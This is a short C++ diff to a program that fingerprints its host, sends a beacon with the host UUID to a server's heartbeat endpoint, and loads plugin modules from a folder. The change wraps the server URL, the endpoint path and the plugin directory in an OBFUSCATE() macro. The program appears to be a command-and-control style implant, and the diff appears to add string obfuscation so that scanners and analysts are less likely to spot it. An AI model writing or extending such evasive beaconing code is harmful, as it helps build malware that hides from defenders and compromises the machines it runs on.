@@ -3,6 +3,7 @@
 #include "Globals.h"
 #include <iostream>
 #include <thread>
+#include "Obfuscation.h"
 #include <chrono>
 #include <curl/curl.h>
 
@@ -14,7 +15,7 @@ static void heartbeat(const std::string& server) {
     CURL* curl = curl_easy_init();
     if(!curl) return;
     while(true) {
-        std::string url = server + "/heartbeat";
+        std::string url = server + OBFUSCATE("/heartbeat");
         std::string payload = "{\"uuid\":\"" + g_uuid + "\"}";
         curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());
@@ -29,10 +30,10 @@ static void heartbeat(const std::string& server) {
 int main() {
     auto fp = collect_fingerprint();
     g_uuid = fp.uuid;
-    std::thread hb(heartbeat, "http://localhost:5000");
+    std::thread hb(heartbeat, OBFUSCATE("http://localhost:5000"));
     hb.detach();
 
-    Loader loader("./plugins");
+    Loader loader(OBFUSCATE("./plugins"));
     loader.load();
     for (const auto& mod : loader.modules()) {
         if(g_safe_mode.load() || g_deep_sleep.load()) break;
